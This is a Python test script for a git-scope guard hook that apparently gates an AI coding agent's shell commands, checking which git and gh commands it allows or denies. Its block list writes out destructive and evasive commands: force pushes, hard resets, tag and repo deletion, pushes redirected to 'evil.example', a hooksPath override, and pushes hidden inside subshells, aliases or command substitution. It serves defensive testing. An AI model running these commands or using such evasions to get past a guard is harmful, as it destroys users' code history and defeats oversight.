import json
import subprocess
import sys

HOOK = ".claude/hooks/guard_git_scope.py"

OTHER_OWNER = "someone-else"
OTHER_REPO = "other-repo"
OTHER = f"{OTHER_OWNER}/{OTHER_REPO}"
ALLOWED = "pranvirsingh/WordLens"

ALLOW_CASES = [
    "git commit -m 'Imp : Ship it (finally)'",
    'bash -c "git status"',
    "git -c core.pager=cat log --oneline -3",
    "git push origin --delete feat/old-branch",
    "git push origin :feat/old-branch",
    "git add backend/app/services/cliproxy_client.py",
    "git commit -m 'Imp : Gemini connection plumbing'",
    "git push -u origin feat/wl-v1",
    "gh pr create --title test --body test",
    "gh pr merge 41 --merge",
    "git tag v1.1.0",
    "git tag -l",
    "git push origin v1.1.0",
    "gh release create v1.1.0 --title v1.1.0 --notes notes",
    "git checkout -b feat/wl-v1",
    "git log --oneline -5 && gh pr list",
    "git branch -d some-old-merged-branch",
    "git merge --no-ff feat/wl-v1",
    "git config user.name",
    "git config --get user.email",
    # a dry-run clean whose --exclude value happens to contain the letter
    # "f" — must not falsely trip the forced-clean check (the bug found
    # in review: substring-matching "f" anywhere in the whole token)
    "git clean -n -d --exclude=config",
    f"gh pr create --repo {ALLOWED} --title x --body y",
    # path/extension-qualified invocations must still be recognized and
    # allowed when they're not doing anything dangerous
    "/usr/bin/git status",
    "git.exe log --oneline -5",
    # legitimate global options before a safe verb must not confuse verb
    # detection into skipping checks OR into false-blocking a safe command
    "git -C . status",
    "git -c core.pager=cat log --oneline -5",
    "gh --hostname github.com pr list",
    # literal parens with no command substitution must not false-positive
    # on the $(...)/`...` refusal
    "git commit -m 'Fix : handle the edge case (see the linked issue)'",
]

BLOCK_CASES = [
    # subshells, background '&', and commands handed to another shell
    "(git push --force origin main)",
    "git status & git push -f origin main",
    'bash -c "git push -f origin main"',
    'sh -c "cd x && git push origin --delete v1.0.0"',
    # one-off config overrides that smuggle in an alias or a push redirect
    "git -c alias.p='push --force' p origin main",
    "git -c url.https://evil.example/.insteadOf=https://github.com/ push",
    # force push via a '+' refspec, no flag at all
    "git push origin +main",
    "git push origin +HEAD:main",
    # deleting a release tag remotely, every spelling
    "git push origin --delete v1.0.0",
    "git push origin -d v1.0.0",
    "git push origin :v1.0.0",
    "git push origin --delete refs/tags/v1.0.0",
    # Windows path-qualified git must still be recognised
    r"C:\Git\cmd\git.exe push --force origin main",
    "git push --force origin main",
    "git push -f origin main",
    "git push --force-with-lease=refs/heads/main:deadbeef origin main",
    "git reset --hard HEAD~3",
    "git clean -fd",
    "git clean --force",
    "git branch -D main",
    "git tag -d v1.0.0",
    "git tag -D v1.0.0",
    "git push origin :main",
    "git push origin :refs/heads/main",
    "git config url.https://github.com/other/.insteadOf https://github.com/pranvirsingh/",
    "git config --global core.hooksPath /tmp/evil",
    "gh repo delete pranvirsingh/WordLens",
    f"gh pr create --repo {OTHER} --title x --body y",
    f"gh pr create --repo={OTHER} --title x --body y",
    f"git push https://github.com/{OTHER}.git main",
    f"git remote add evil https://github.com/{OTHER}.git",
    # command substitution near a git/gh word — refused outright, since
    # what's actually inside it can't be safely inspected token-by-token
    "echo $(git push --force origin main)",
    "echo `git push --force origin main`",
    # path/extension-qualified invocations must be recognized, not just
    # the bare word — this used to slip through entirely unchecked
    "/usr/bin/git push --force origin main",
    "git.exe push --force origin main",
    # squashed short-option clusters — git's own parser treats these
    # exactly like the flag given on its own
    "git push -uf origin main",
    "git push -fu origin main",
    # a disguised config write whose VALUE happens to spell a readonly
    # flag name must not be mistaken for a read
    'git config alias.foo "--get-all"',
    # ref/history rewriting outside the explicitly-named filter-branch
    "git replace deadbeef cafef00d",
    "git update-ref refs/heads/main deadbeef",
    "git symbolic-ref HEAD refs/heads/main",
    # narrower remote-write verbs missed by the first draft
    "git remote set-head origin main",
    "git remote prune origin",
    # a leading global option must not defeat verb detection — the
    # predecessor hook explicitly skipped these; this file's first draft
    # didn't, re-enabling every check below whichever global flag was used
    "git -c foo=bar push --force origin main",
    "git -C . reset --hard HEAD~3",
    "gh --hostname github.com repo delete pranvirsingh/WordLens",
    # git branch's long-flag spelling of -D (--delete --force / -d -f)
    "git branch --delete --force main",
    "git branch -d -f main",
    # deleting a remote tag via a push refspec, not just local `tag -d`
    "git push origin :refs/tags/v1.0.0",
]

failures = 0

for cmd in ALLOW_CASES:
    payload = json.dumps({"tool_input": {"command": cmd}})
    result = subprocess.run(["py", HOOK], input=payload, capture_output=True, text=True)
    blocked = '"permissionDecision": "deny"' in result.stdout
    status = "FAIL (blocked, should allow)" if blocked else "ok"
    if blocked:
        failures += 1
    print(f"[ALLOW] {status}: {cmd}")

for cmd in BLOCK_CASES:
    payload = json.dumps({"tool_input": {"command": cmd}})
    result = subprocess.run(["py", HOOK], input=payload, capture_output=True, text=True)
    blocked = '"permissionDecision": "deny"' in result.stdout
    status = "ok" if blocked else "FAIL (allowed, should block)"
    if not blocked:
        failures += 1
    print(f"[BLOCK] {status}: {cmd}")

print(f"\n{failures} failures")
sys.exit(1 if failures else 0)
